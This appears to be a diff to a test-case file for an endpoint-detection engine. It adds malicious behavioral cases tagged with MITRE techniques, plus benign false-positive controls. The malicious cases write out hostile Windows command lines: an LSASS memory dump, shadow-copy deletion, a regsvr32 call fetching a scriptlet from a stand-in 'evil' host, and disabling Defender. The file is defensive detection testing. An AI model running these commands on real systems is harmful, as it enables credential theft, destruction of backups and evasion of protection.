@@ -112,6 +112,28 @@ MALICIOUS: list[Case] = [
                              "bW9yZWRhdGFoZXJl", "ZmluYWxjaHVua3oz", "dGhlbGFzdG9uZTQ0")),
          "base64 DNS tunnel (dnscat-style)"),
 
+    # ── Behavioral IOA rules (behavioral_rules.py) ─ representative sample;
+    #    the exhaustive per-rule + benign-control coverage is in
+    #    tests/test_behavioral_rules.py. inp = (image, parent, cmdline, path).
+    Case("beh-comsvcs-lsass", "behavior", True, "T1003.001", "credential-access",
+         ("rundll32.exe", "cmd.exe",
+          "rundll32 comsvcs.dll MiniDump 640 c:\\lsass.dmp full", ""),
+         "LSASS dump via comsvcs MiniDump"),
+    Case("beh-vssadmin", "behavior", True, "T1490", "impact",
+         ("vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all /quiet", ""),
+         "shadow-copy deletion (ransomware precursor)"),
+    Case("beh-squiblydoo", "behavior", True, "T1218.010", "defense-evasion",
+         ("regsvr32.exe", "cmd.exe",
+          "regsvr32 /s /u /i:https://evil/x.sct scrobj.dll", ""),
+         "regsvr32 remote scriptlet (Squiblydoo)"),
+    Case("beh-defender-off", "behavior", True, "T1562.001", "defense-evasion",
+         ("powershell.exe", "cmd.exe",
+          "Set-MpPreference -DisableRealtimeMonitoring $true", ""),
+         "Defender real-time protection disabled"),
+    Case("beh-office-shell", "behavior", True, "T1059", "execution",
+         ("powershell.exe", "winword.exe", "powershell -nop -w hidden", ""),
+         "Office spawned a hidden PowerShell"),
+
     # ── Multi-stage kill-chain correlation (edr/killchain.py) ───────────────
     # inp = (actor, [(technique, title), ...]) — a sequence on ONE process.
     # These pin the correlation win: the base same-category correlator would
@@ -268,6 +290,20 @@ BENIGN: list[Case] = [
     Case("b-tunnel-nipio-dev", "tunnel", False,
          inp=("myapp.127.0.0.1.nip.io", "myapp.127.0.0.1.nip.io"),
          note="legit local dev over nip.io — flagged at most, never blocked"),
+
+    # Behavioral-rule FALSE-POSITIVE controls — ordinary admin/user commands.
+    Case("b-beh-reg-query", "behavior", False,
+         inp=("reg.exe", "cmd.exe", "reg query hklm\\software", ""),
+         note="reg query (read) — not add/save"),
+    Case("b-beh-sc-query", "behavior", False,
+         inp=("sc.exe", "cmd.exe", "sc query windefend", ""),
+         note="service query — not create"),
+    Case("b-beh-certutil-hash", "behavior", False,
+         inp=("certutil.exe", "cmd.exe", "certutil -hashfile a.exe sha256", ""),
+         note="file hashing — not download/decode"),
+    Case("b-beh-net-view", "behavior", False,
+         inp=("net.exe", "cmd.exe", "net view", ""),
+         note="network view — not user /add"),
 
     # Kill-chain FALSE-POSITIVE controls — must NOT raise a multi-stage chain.
     Case("b-chain-single-tactic", "killchain", False,
